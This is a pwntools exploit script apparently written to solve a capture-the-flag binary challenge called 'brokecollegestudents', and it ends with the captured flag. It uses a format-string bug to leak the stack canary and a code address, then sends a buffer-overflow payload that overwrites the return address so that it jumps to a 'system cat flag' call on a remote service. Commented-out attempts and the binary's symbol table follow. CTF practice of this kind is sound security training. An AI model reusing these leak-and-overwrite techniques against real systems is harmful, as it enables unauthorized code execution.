from pwn import *
import os
import random
import time

elf = context.binary = ELF("brokecollegestudents")
libc = elf.libc
context.log_level = "DEBUG"

# main  0x11c9
# 0x1425 cmp     [rbp+var_1C], eax
# 0x00005555555553d8 <+43>:	call   0x5555555550b0 <fopen@plt>
# 0000000000001371 call    _strlen

gs = '''
# break catch
# break 0x5555555556f5
# break *0x555555555688
# break *0x5555555556cc
# break *0x5555555556d1
# break *0x5555555556d1
break *0x5555555556e5

'''

# cmp canary 0x5555555556e5

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return remote('143.198.184.186',5001)
        return process(elf.path)

# 1.- Leaking
print(elf.plt)
print(elf.symbols)
p=start()

def get_leak(i,p):
    p.sendlineafter("name:",b'%'+bytes(str(i),'utf-8')+b'$p')
    p.recvuntil('you got was:')
    canary=p.recvuntil('What ')
    return canary

def leaking(i,p):
    p.sendlineafter("Choice:",b'1')
    p.sendlineafter(b'===========================\n',b'1')
    p.sendlineafter("CHOOSE:",b'1')
    leak=get_leak(i,p)[3:-5]
    # time.sleep(1)
    return leak

# binary=int(leaking(11),16)-0x88c
canary=int(leaking(9,p),16)
print(9,' leak------>',hex(canary))

binary=str(leaking(11,p))
binary=binary[:-4]+'4f1'
binary=[x for x in binary]
binary=int(''.join(binary[2:]),16)-265+5+260
# binary[]=
print(11,' leak------>',hex(binary))
stack=leaking(8,p)
print(8,' leak------>',stack)


padd=b'A'*24
exploit=padd+p64(canary)+p64(canary)+p64(binary)

p.sendlineafter("Choice:",b'1')
p.sendlineafter(b'===========================\n',b'1')
p.sendlineafter("CHOOSE:",b'1')
p.sendlineafter("CHOOSE:",b'1')
p.sendlineafter("CHOOSE:",b'1')

p.sendline(exploit)
p.interactive()

# kqctf{did_you_resort_to_selling_NFTs_for_college_money_????}

#    0x5555555558f6 <main>:	endbr64 
# 
# print(elf.symb    ols[''])
# 001014f1 system cat flag
# p.sendlineafter("Choice:",b'1')
# p.sendlineafter(b'===========================\n',b'1')
# p.sendlineafter("CHOOSE:",b'1')
# p.sendlineafter("CHOOSE:",b'1')
# p.sendlineafter("CHOOSE:",b'1')
# canary=leak(6)
# print(6,' canary------>',canary[3:-5])
# for i in range(8,10):
#     p.sendlineafter("Choice:",b'1')
#     p.sendlineafter(b'===========================\n',b'1')
#     p.sendlineafter("CHOOSE:",b'1')
#     canary=leak(i)
#     print(i,' canary------>',canary[3:-5])
#     time.sleep(1)
# p.interactive()
# p.sendlineafter("Choice:",b'1')
# p.sendlineafter(b'===========================\n',b'1')
# p.sendlineafter("CHOOSE:",b'1')
# p.sendlineafter("CHOOSE:",b'1')
# p.sendlineafter("CHOOSE:",b'1')
# canary=leak(10)
# print(10,' canary------>',canary[3:-5])

# 0x000000000000101a : ret


# Non-debugging symbols:
# 0x0000000000001000  _init
# 0x00000000000010c0  __cxa_finalize@plt
# 0x00000000000010d0  putchar@plt
# 0x00000000000010e0  puts@plt
# 0x00000000000010f0  __stack_chk_fail@plt
# 0x0000000000001100  system@plt
# 0x0000000000001110  printf@plt
# 0x0000000000001120  fflush@plt
# 0x0000000000001130  __isoc99_scanf@plt
# 0x0000000000001140  exit@plt
# 0x0000000000001150  rand@plt
# 0x0000000000001160  _start
# 0x0000000000001190  deregister_tm_clones
# 0x00000000000011c0  register_tm_clones
# 0x0000000000001200  __do_global_dtors_aux
# 0x0000000000001240  frame_dummy
# 0x0000000000001249  menu
# 0x0000000000001393  display_money
# 0x00000000000013c6  shop
# 0x0000000000001529  safari
# 0x0000000000001649  catch
# 0x00000000000016f7  battle
# 0x00000000000018c9  quit
# 0x00000000000018f6  main
# 0x0000000000001930  __libc_csu_init
# 0x00000000000019a0  __libc_csu_fini
# 0x00000000000019a8  _fini

# 1  canary------> b'0x555e006ba260'
# 2  canary------> b'0x7fed945f88c0'
# 3  canary------> b'0x7fed9431b224'
# 6  canary------> b'0x507ed70070243625'
# 8  canary------> b'0x7ffe414c1c80'
# 9  canary------> b'0x6c8824017a51100'
